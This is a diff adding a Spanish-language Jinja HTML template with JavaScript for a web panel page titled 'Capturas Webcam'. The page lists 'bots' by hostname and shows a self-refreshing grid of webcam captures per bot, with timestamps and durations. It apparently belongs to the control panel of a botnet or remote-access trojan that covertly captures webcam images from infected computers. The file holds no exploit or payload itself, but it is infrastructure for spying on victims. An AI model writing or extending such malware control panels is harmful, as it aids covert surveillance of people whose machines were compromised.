@@ -1,0 +1,78 @@
+{% extends "base.html" %}
+
+{% block title %}Webcam{% endblock %}
+
+{% block content %}
+<div class="section-header">
+    <h2><i class="fas fa-camera"></i> Capturas Webcam</h2>
+    <div class="filters">
+        <select id="bot-filter" onchange="loadWebcam()">
+            <option value="">Todos los bots</option>
+        </select>
+        <button class="btn" onclick="loadWebcam()"><i class="fas fa-sync"></i></button>
+    </div>
+</div>
+
+<div class="image-grid" id="webcam-grid"></div>
+
+<div id="lightbox" class="lightbox" onclick="closeLightbox()">
+    <span class="close">&times;</span>
+    <img id="lightbox-img">
+    <div class="lightbox-info" id="lightbox-info"></div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+async function loadBots() {
+    const resp = await fetch('/api/panel/bots');
+    const bots = await resp.json();
+    const select = document.getElementById('bot-filter');
+    bots.forEach(bot => {
+        const opt = document.createElement('option');
+        opt.value = bot.bot_id;
+        opt.textContent = bot.hostname;
+        select.appendChild(opt);
+    });
+}
+
+async function loadWebcam() {
+    const botId = document.getElementById('bot-filter').value;
+    const url = botId ? `/api/panel/webcam?bot_id=${botId}` : '/api/panel/webcam';
+    
+    try {
+        const resp = await fetch(url);
+        const captures = await resp.json();
+        
+        document.getElementById('webcam-grid').innerHTML = captures.map(c => `
+            <div class="image-card" onclick="openLightbox(${c.id}, '${c.bot_id}', '${c.timestamp}', ${c.duration})">
+                <img src="/api/panel/webcam/${c.id}" alt="Webcam ${c.id}" loading="lazy">
+                <div class="info">
+                    <p><i class="fas fa-robot"></i> ${c.bot_id.substring(0,12)}...</p>
+                    <p><i class="fas fa-clock"></i> ${new Date(c.timestamp).toLocaleString()}</p>
+                    ${c.duration ? `<p><i class="fas fa-video"></i> ${c.duration}s</p>` : ''}
+                </div>
+            </div>
+        `).join('');
+    } catch(e) {}
+}
+
+function openLightbox(id, botId, timestamp, duration) {
+    document.getElementById('lightbox-img').src = `/api/panel/webcam/${id}`;
+    document.getElementById('lightbox-info').innerHTML = `
+        <p>Bot: ${botId}</p>
+        <p>Fecha: ${new Date(timestamp).toLocaleString()}</p>
+        ${duration ? `<p>Duración: ${duration}s</p>` : ''}
+    `;
+    document.getElementById('lightbox').style.display = 'flex';
+}
+
+function closeLightbox() {
+    document.getElementById('lightbox').style.display = 'none';
+}
+
+loadBots();
+loadWebcam();
+setInterval(loadWebcam, 15000);
+</script>
+{% endblock %}
